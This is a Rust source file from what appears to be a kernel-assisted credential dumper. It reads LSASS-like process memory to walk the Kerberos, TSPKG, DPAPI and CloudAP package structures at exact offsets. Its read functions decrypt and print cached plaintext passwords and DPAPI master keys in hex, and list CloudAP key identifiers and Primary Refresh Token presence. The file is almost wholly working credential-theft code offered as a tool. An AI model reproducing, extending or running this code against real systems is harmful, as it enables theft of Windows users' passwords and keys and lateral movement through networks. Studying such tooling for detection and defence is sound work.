//! Exact-profile authentication-package readers for VTL0 process memory.

use crate::{
    adapter::KernelAdapter,
    bytes::{read_u16, read_u32, read_u64, zero},
    credential_crypto::{self, LsaKeys, SecretBuffer},
    heap::HeapBuffer,
    output::Output,
    process::ProcessRecord,
    profiles::{CredentialComponent, CredentialProfile},
    user_module::{UserModule, UserModuleError, find_module},
    virtual_memory::{ProcessMemory, VirtualMemoryError, valid_user_address},
};
use core::fmt::{self, Write};

const MAX_ENTRIES: usize = 64;
const MAX_NAME_CHARS: usize = 256;
const MAX_SECRET_BYTES: usize = 0x1000;
const MAX_TICKETS: usize = 1024;

#[derive(Default)]
pub struct PackageStats {
    pub entries: usize,
    pub decrypted: usize,
    pub kerberos: usize,
    pub cloudap: usize,
    pub dpapi: usize,
    pub tspkg: usize,
}

#[derive(Debug)]
pub struct PackageError {
    pub stage: &'static str,
    pub code: u32,
}

struct WideString {
    value: [u16; MAX_NAME_CHARS],
    length: usize,
}

impl WideString {
    const fn empty() -> Self {
        Self {
            value: [0; MAX_NAME_CHARS],
            length: 0,
        }
    }

    fn display(&self) -> WideDisplay<'_> {
        WideDisplay(&self.value[..self.length])
    }
}

impl Drop for WideString {
    fn drop(&mut self) {
        for value in &mut self.value {
            unsafe { core::ptr::write_volatile(value, 0) };
        }
        self.length = 0;
    }
}

struct WideDisplay<'a>(&'a [u16]);

impl fmt::Display for WideDisplay<'_> {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        for value in self.0 {
            let character = char::from_u32(*value as u32)
                .filter(|value| *value == '\t' || (!value.is_control() && *value != '\u{007f}'));
            formatter.write_char(character.unwrap_or('?'))?;
        }

        Ok(())
    }
}

struct WideBytes<'a>(&'a [u8]);

impl fmt::Display for WideBytes<'_> {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        for bytes in self.0.as_chunks::<2>().0 {
            let value = u16::from_le_bytes([bytes[0], bytes[1]]);

            if value == 0 {
                break;
            }

            let character = char::from_u32(value as u32)
                .filter(|value| *value == '\t' || (!value.is_control() && *value != '\u{007f}'));
            formatter.write_char(character.unwrap_or('?'))?;
        }

        Ok(())
    }
}

struct Hex<'a>(&'a [u8]);

impl fmt::Display for Hex<'_> {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        for byte in self.0 {
            write!(formatter, "{byte:02x}")?;
        }

        Ok(())
    }
}

struct Guid<'a>(&'a [u8]);

impl fmt::Display for Guid<'_> {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        if self.0.len() != 16 {
            return formatter.write_str("invalid");
        }

        write!(
            formatter,
            "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-",
            self.0[3],
            self.0[2],
            self.0[1],
            self.0[0],
            self.0[5],
            self.0[4],
            self.0[7],
            self.0[6],
            self.0[8],
            self.0[9]
        )?;

        for byte in &self.0[10..] {
            write!(formatter, "{byte:02x}")?;
        }

        Ok(())
    }
}

struct Seen {
    values: [u64; MAX_ENTRIES],
    count: usize,
}

impl Seen {
    const fn new() -> Self {
        Self {
            values: [0; MAX_ENTRIES],
            count: 0,
        }
    }

    fn insert(&mut self, value: u64) -> bool {
        if self.values[..self.count].contains(&value) || self.count == self.values.len() {
            return false;
        }

        self.values[self.count] = value;
        self.count += 1;

        true
    }
}

pub fn read<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    process: &ProcessRecord,
    profile: &CredentialProfile,
    keys: &LsaKeys,
    output: &mut Output,
) -> Result<PackageStats, PackageError> {
    validate_expected_absent(memory, process, profile)?;
    let mut stats = PackageStats::default();

    read_kerberos(memory, process, profile, keys, output, &mut stats)?;
    read_cloudap(memory, process, profile, output, &mut stats)?;
    read_dpapi(memory, process, profile, keys, output, &mut stats)?;
    read_tspkg(memory, process, profile, keys, output, &mut stats)?;

    let _ = writeln!(
        output,
        "[*] Packages: kerberos={} cloudap={} dpapi={} tspkg={}",
        stats.kerberos, stats.cloudap, stats.dpapi, stats.tspkg
    );

    Ok(stats)
}

fn read_kerberos<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    process: &ProcessRecord,
    profile: &CredentialProfile,
    keys: &LsaKeys,
    output: &mut Output,
    stats: &mut PackageStats,
) -> Result<(), PackageError> {
    let component = component(profile, "kerberos")?;
    let Some(module) = open_exact(memory, process, component)? else {
        output.line("[*] Kerberos: package is not loaded");
        return Ok(());
    };
    let mut records = [0_u64; MAX_ENTRIES];
    let count = collect_avl(
        memory,
        module.base + component.root_rva as u64,
        &mut records,
    )?;

    for record_address in &records[..count] {
        let mut record = [0_u8; 0x178];
        memory
            .read(*record_address, &mut record)
            .map_err(memory_error)?;
        let luid = read_u64(&record, 0x48).unwrap_or(0);
        let user = read_unicode(memory, &record, 0x88)?;
        let domain = read_unicode(memory, &record, 0x98)?;
        let password_type = read_u32(&record, 0xb0).unwrap_or(0);
        let secret = if password_type == 2 {
            decrypt_descriptor(memory, &record, 0xb8, keys)?
        } else {
            None
        };
        let key_list = read_u64(&record, 0x118).unwrap_or(0);
        let key_count = read_key_count(memory, key_list)?;
        let mut ticket_count = 0_usize;

        for group in 0..3 {
            let count = count_list(memory, record_address + 0x128 + group * 0x18)?;
            ticket_count = ticket_count
                .checked_add(count)
                .filter(|value| *value <= MAX_TICKETS)
                .ok_or_else(|| error("credential-kerberos-ticket-count", 13))?;
        }

        let _ = writeln!(output, "[+] Kerberos session");
        let _ = writeln!(output, "    LUID     : 0x{luid:016x}");
        let _ = writeln!(output, "    User     : {}", user.display());
        let _ = writeln!(output, "    Domain   : {}", domain.display());
        let _ = writeln!(output, "    Keys     : {key_count}");
        let _ = writeln!(output, "    Tickets  : {ticket_count}");

        if let Some((secret, length)) = secret {
            let _ = writeln!(
                output,
                "    Password : {}",
                WideBytes(&secret.as_slice()[..length])
            );
            stats.decrypted += 1;
        }

        zero(&mut record);
        stats.kerberos += 1;
        stats.entries += 1;
    }

    zero_u64(&mut records);

    Ok(())
}

fn read_key_count<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    key_list: u64,
) -> Result<usize, PackageError> {
    if key_list == 0 {
        return Ok(0);
    }

    if !valid_user_address(key_list) {
        return Err(error("credential-kerberos-key-list", 13));
    }

    let mut header = [0_u8; 0x28];
    memory.read(key_list, &mut header).map_err(memory_error)?;
    let count = read_u32(&header, 4).unwrap_or(0) as usize;
    zero(&mut header);

    if count > MAX_ENTRIES {
        return Err(error("credential-kerberos-key-count", 13));
    }

    Ok(count)
}

fn read_tspkg<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    process: &ProcessRecord,
    profile: &CredentialProfile,
    keys: &LsaKeys,
    output: &mut Output,
    stats: &mut PackageStats,
) -> Result<(), PackageError> {
    let component = component(profile, "tspkg")?;
    let Some(module) = open_exact(memory, process, component)? else {
        output.line("[*] TSPKG: package is not loaded");
        return Ok(());
    };
    let mut records = [0_u64; MAX_ENTRIES];
    let count = collect_avl(
        memory,
        module.base + component.root_rva as u64,
        &mut records,
    )?;

    for record_address in &records[..count] {
        let mut record = [0_u8; 0x90];
        memory
            .read(*record_address, &mut record)
            .map_err(memory_error)?;
        let primary_address = read_u64(&record, 0x88).unwrap_or(0);

        if primary_address == 0 {
            zero(&mut record);
            continue;
        }

        if !valid_user_address(primary_address) {
            return Err(error("credential-tspkg-primary", 13));
        }

        let luid = read_u64(&record, 0x70).unwrap_or(0);
        let mut primary = [0_u8; 0x38];
        memory
            .read(primary_address, &mut primary)
            .map_err(memory_error)?;
        let user = read_unicode(memory, &primary, 8)?;
        let domain = read_unicode(memory, &primary, 0x18)?;
        let secret = decrypt_descriptor(memory, &primary, 0x28, keys)?;

        let _ = writeln!(output, "[+] TSPKG credential");
        let _ = writeln!(output, "    LUID     : 0x{luid:016x}");
        let _ = writeln!(output, "    User     : {}", user.display());
        let _ = writeln!(output, "    Domain   : {}", domain.display());

        if let Some((secret, length)) = secret {
            let _ = writeln!(
                output,
                "    Password : {}",
                WideBytes(&secret.as_slice()[..length])
            );
            stats.decrypted += 1;
        } else {
            output.line("    Password : not cached");
        }

        zero(&mut primary);
        zero(&mut record);
        stats.tspkg += 1;
        stats.entries += 1;
    }

    zero_u64(&mut records);

    Ok(())
}

fn read_dpapi<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    process: &ProcessRecord,
    profile: &CredentialProfile,
    keys: &LsaKeys,
    output: &mut Output,
    stats: &mut PackageStats,
) -> Result<(), PackageError> {
    let component = component(profile, "dpapi")?;
    let Some(module) = open_exact(memory, process, component)? else {
        output.line("[*] DPAPI: package is not loaded");
        return Ok(());
    };
    let head = module.base + component.root_rva as u64;
    let (mut current, last) = list_head(memory, head)?;
    let mut previous = head;
    let mut seen = Seen::new();

    while current != head {
        if !valid_user_address(current) || !seen.insert(current) {
            return Err(error("credential-dpapi-list", 13));
        }

        let mut record = [0_u8; 0x34];
        memory.read(current, &mut record).map_err(memory_error)?;
        let next = read_u64(&record, 0).unwrap_or(0);
        let back = read_u64(&record, 8).unwrap_or(0);
        let luid = read_u64(&record, 0x10).unwrap_or(0);
        let mut identifier = [0_u8; 16];
        identifier.copy_from_slice(&record[0x18..0x28]);
        let key_size = read_u32(&record, 0x30).unwrap_or(0) as usize;

        if back != previous
            || key_size == 0
            || key_size > MAX_SECRET_BYTES
            || (next != head && !valid_user_address(next))
        {
            zero(&mut record);
            zero(&mut identifier);
            return Err(error("credential-dpapi-record", 13));
        }

        let mut encrypted =
            HeapBuffer::new(key_size).ok_or_else(|| error("credential-dpapi-allocation", 8))?;
        memory
            .read(current + 0x34, encrypted.as_mut_slice())
            .map_err(memory_error)?;
        let plain = credential_crypto::decrypt(encrypted.as_slice(), keys).map_err(crypto_error)?;
        let _ = writeln!(output, "[+] DPAPI cached master key");
        let _ = writeln!(output, "    LUID : 0x{luid:016x}");
        let _ = writeln!(output, "    GUID : {}", Guid(&identifier));
        let _ = writeln!(output, "    Key  : {}", Hex(plain.as_slice()));
        stats.decrypted += 1;
        stats.dpapi += 1;
        stats.entries += 1;
        zero(&mut identifier);
        zero(&mut record);
        previous = current;
        current = next;
    }

    if previous != last {
        return Err(error("credential-dpapi-closure", 13));
    }

    Ok(())
}

fn read_cloudap<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    process: &ProcessRecord,
    profile: &CredentialProfile,
    output: &mut Output,
    stats: &mut PackageStats,
) -> Result<(), PackageError> {
    let component = component(profile, "cloudap")?;
    let Some(module) = open_exact(memory, process, component)? else {
        output.line("[*] CloudAP: package is not loaded");
        return Ok(());
    };
    let head = module.base + component.root_rva as u64;
    let (mut current, last) = list_head(memory, head)?;
    let mut previous = head;
    let mut seen = Seen::new();

    while current != head {
        if !valid_user_address(current) || !seen.insert(current) {
            return Err(error("credential-cloudap-list", 13));
        }

        let mut logon = [0_u8; 0x40];
        memory.read(current, &mut logon).map_err(memory_error)?;
        let next = read_u64(&logon, 0).unwrap_or(0);
        let back = read_u64(&logon, 8).unwrap_or(0);
        let luid = read_u64(&logon, 0x1c).unwrap_or(0);
        let cache_address = read_u64(&logon, 0x38).unwrap_or(0);

        if back != previous
            || (next != head && !valid_user_address(next))
            || (cache_address != 0 && !valid_user_address(cache_address))
        {
            zero(&mut logon);
            return Err(error("credential-cloudap-record", 13));
        }

        if cache_address != 0 {
            let mut cache = [0_u8; 0x128];
            memory
                .read(cache_address, &mut cache)
                .map_err(memory_error)?;
            let user = inline_wide(&cache[0x68..0x68 + 65 * 2]);
            let key_address = read_u64(&cache, 0x108).unwrap_or(0);
            let prt_size = read_u32(&cache, 0x118).unwrap_or(0);
            let prt_address = read_u64(&cache, 0x120).unwrap_or(0);
            let (key_size, mut key_identifier) = read_cloudap_key(memory, key_address)?;
            let _ = writeln!(output, "[+] CloudAP cache record");
            let _ = writeln!(output, "    LUID        : 0x{luid:016x}");
            let _ = writeln!(output, "    User        : {}", user.display());
            let _ = writeln!(output, "    Key GUID    : {}", Guid(&key_identifier));
            let _ = writeln!(output, "    Key bytes   : {key_size}");
            let _ = writeln!(
                output,
                "    PRT cached  : {}",
                yes_no(prt_size != 0 && valid_user_address(prt_address))
            );
            output.line("    PRT value   : not emitted");
            zero(&mut key_identifier);
            zero(&mut cache);
            stats.cloudap += 1;
            stats.entries += 1;
        }

        zero(&mut logon);
        previous = current;
        current = next;
    }

    if previous != last {
        return Err(error("credential-cloudap-closure", 13));
    }

    Ok(())
}

fn read_cloudap_key<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    address: u64,
) -> Result<(u32, [u8; 16]), PackageError> {
    let mut identifier = [0_u8; 16];

    if address == 0 {
        return Ok((0, identifier));
    }

    if !valid_user_address(address) {
        return Err(error("credential-cloudap-key", 13));
    }

    let mut header = [0_u8; 0x20];
    memory.read(address, &mut header).map_err(memory_error)?;
    let size = read_u32(&header, 0x0c).unwrap_or(0);

    if size as usize > MAX_SECRET_BYTES {
        zero(&mut header);
        return Err(error("credential-cloudap-key-size", 13));
    }

    identifier.copy_from_slice(&header[0x10..0x20]);
    zero(&mut header);

    Ok((size, identifier))
}

fn validate_expected_absent<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    process: &ProcessRecord,
    profile: &CredentialProfile,
) -> Result<(), PackageError> {
    for name in profile.expected_absent {
        match find_module(memory, process.peb, name.as_bytes()) {
            Err(UserModuleError::NotFound) => {}
            Ok(_) => return Err(error("credential-unprofiled-package", 1306)),
            Err(value) => return Err(module_error(value)),
        }
    }

    Ok(())
}

fn component<'a>(
    profile: &'a CredentialProfile,
    package: &str,
) -> Result<&'a CredentialComponent, PackageError> {
    profile
        .components
        .iter()
        .find(|component| component.package == package)
        .ok_or_else(|| error("credential-component-profile", 1306))
}

fn open_exact<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    process: &ProcessRecord,
    component: &CredentialComponent,
) -> Result<Option<UserModule>, PackageError> {
    let module = match find_module(memory, process.peb, component.name.as_bytes()) {
        Ok((module, _)) => module,
        Err(UserModuleError::NotFound) => return Ok(None),
        Err(value) => return Err(module_error(value)),
    };

    if module.identity.timestamp != component.pe_timestamp
        || module.identity.checksum != component.pe_checksum
        || module.identity.image_size != component.image_size
        || component.root_rva == 0
        || component.root_rva >= component.image_size
    {
        return Err(error("credential-component-identity", 1306));
    }

    Ok(Some(module))
}

fn collect_avl<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    table: u64,
    records: &mut [u64; MAX_ENTRIES],
) -> Result<usize, PackageError> {
    let mut header = [0_u8; 0x68];
    memory.read(table, &mut header).map_err(memory_error)?;
    let root = read_u64(&header, 0x10).unwrap_or(0);
    let declared = read_u32(&header, 0x2c).unwrap_or(0) as usize;
    zero(&mut header);

    if declared > MAX_ENTRIES || (root != 0 && !valid_user_address(root)) {
        return Err(error("credential-avl-header", 13));
    }

    let mut stack = [0_u64; MAX_ENTRIES];
    let mut stack_count = 0_usize;
    let mut count = 0_usize;
    let mut seen = Seen::new();

    if root != 0 {
        stack[0] = root;
        stack_count = 1;
    }

    while stack_count != 0 {
        stack_count -= 1;
        let current = stack[stack_count];

        if !valid_user_address(current) || !seen.insert(current) {
            return Err(error("credential-avl-node", 13));
        }

        let mut node = [0_u8; 0x28];
        memory.read(current, &mut node).map_err(memory_error)?;
        let left = read_u64(&node, 8).unwrap_or(0);
        let right = read_u64(&node, 0x10).unwrap_or(0);
        let ordered = read_u64(&node, 0x20).unwrap_or(0);
        zero(&mut node);

        if !valid_user_address(ordered)
            || (left != 0 && !valid_user_address(left))
            || (right != 0 && !valid_user_address(right))
            || count == records.len()
        {
            return Err(error("credential-avl-shape", 13));
        }

        records[count] = ordered;
        count += 1;

        for child in [left, right] {
            if child != 0 {
                if stack_count == stack.len() {
                    return Err(error("credential-avl-depth", 13));
                }

                stack[stack_count] = child;
                stack_count += 1;
            }
        }
    }

    zero_u64(&mut stack);

    if count != declared {
        return Err(error("credential-avl-count", 13));
    }

    Ok(count)
}

fn list_head<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    head: u64,
) -> Result<(u64, u64), PackageError> {
    let mut links = [0_u8; 16];
    memory.read(head, &mut links).map_err(memory_error)?;
    let first = read_u64(&links, 0).unwrap_or(0);
    let last = read_u64(&links, 8).unwrap_or(0);
    zero(&mut links);

    if (first != head && !valid_user_address(first)) || (last != head && !valid_user_address(last))
    {
        return Err(error("credential-package-list", 13));
    }

    Ok((first, last))
}

fn count_list<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    head: u64,
) -> Result<usize, PackageError> {
    let (mut current, last) = list_head(memory, head)?;
    let mut previous = head;
    let mut seen = Seen::new();

    while current != head {
        if !valid_user_address(current) || !seen.insert(current) {
            return Err(error("credential-ticket-node", 13));
        }

        let mut links = [0_u8; 16];
        memory.read(current, &mut links).map_err(memory_error)?;
        let next = read_u64(&links, 0).unwrap_or(0);
        let back = read_u64(&links, 8).unwrap_or(0);
        zero(&mut links);

        if back != previous || (next != head && !valid_user_address(next)) {
            return Err(error("credential-ticket-links", 13));
        }

        previous = current;
        current = next;
    }

    if previous != last {
        return Err(error("credential-ticket-closure", 13));
    }

    Ok(seen.count)
}

fn decrypt_descriptor<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    record: &[u8],
    offset: usize,
    keys: &LsaKeys,
) -> Result<Option<(SecretBuffer, usize)>, PackageError> {
    let length = read_u16(record, offset).unwrap_or(0) as usize;
    let maximum = read_u16(record, offset + 2).unwrap_or(0) as usize;
    let pointer = read_u64(record, offset + 8).unwrap_or(0);

    if length == 0 || pointer == 0 {
        return Ok(None);
    }

    if length > maximum || maximum > MAX_SECRET_BYTES || !valid_user_address(pointer) {
        return Err(error("credential-package-secret", 13));
    }

    let mut encrypted =
        HeapBuffer::new(maximum).ok_or_else(|| error("credential-package-allocation", 8))?;
    memory
        .read(pointer, encrypted.as_mut_slice())
        .map_err(memory_error)?;
    let plain = credential_crypto::decrypt(encrypted.as_slice(), keys).map_err(crypto_error)?;
    let usable = core::cmp::min(length, plain.as_slice().len());

    Ok(Some((plain, usable)))
}

fn read_unicode<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    record: &[u8],
    offset: usize,
) -> Result<WideString, PackageError> {
    let length = read_u16(record, offset).unwrap_or(0) as usize;
    let maximum = read_u16(record, offset + 2).unwrap_or(0) as usize;
    let pointer = read_u64(record, offset + 8).unwrap_or(0);
    let mut output = WideString::empty();

    if length == 0 || pointer == 0 {
        return Ok(output);
    }

    if length & 1 != 0
        || length > maximum
        || length > (MAX_NAME_CHARS - 1) * 2
        || !valid_user_address(pointer)
    {
        return Err(error("credential-package-string", 13));
    }

    let mut bytes = [0_u8; MAX_NAME_CHARS * 2];
    memory
        .read(pointer, &mut bytes[..length])
        .map_err(memory_error)?;
    let count = length / 2;

    for index in 0..count {
        output.value[index] = u16::from_le_bytes([bytes[index * 2], bytes[index * 2 + 1]]);
    }

    output.length = output.value[..count]
        .iter()
        .position(|value| *value == 0)
        .unwrap_or(count);
    zero(&mut bytes);

    Ok(output)
}

fn inline_wide(input: &[u8]) -> WideString {
    let mut output = WideString::empty();
    let count = core::cmp::min(input.len() / 2, MAX_NAME_CHARS - 1);

    for index in 0..count {
        let value = u16::from_le_bytes([input[index * 2], input[index * 2 + 1]]);

        if value == 0 {
            break;
        }

        output.value[output.length] = value;
        output.length += 1;
    }

    output
}

fn zero_u64(values: &mut [u64]) {
    for value in values {
        unsafe { core::ptr::write_volatile(value, 0) };
    }
}

const fn error(stage: &'static str, code: u32) -> PackageError {
    PackageError { stage, code }
}

const fn memory_error(value: VirtualMemoryError) -> PackageError {
    error(value.stage(), value.code())
}

const fn module_error(value: UserModuleError) -> PackageError {
    error(value.stage(), value.code())
}

fn crypto_error(value: credential_crypto::CryptoError) -> PackageError {
    error(value.stage(), value.code())
}

const fn yes_no(value: bool) -> &'static str {
    if value { "yes" } else { "no" }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn seen_rejects_duplicate_nodes() {
        let mut seen = Seen::new();
        assert!(seen.insert(0x1000));
        assert!(!seen.insert(0x1000));
    }

    #[test]
    fn inline_wide_stops_at_terminator() {
        let value = inline_wide(&[b'a', 0, b'b', 0, 0, 0, b'c', 0]);
        assert_eq!(value.length, 2);
    }
}
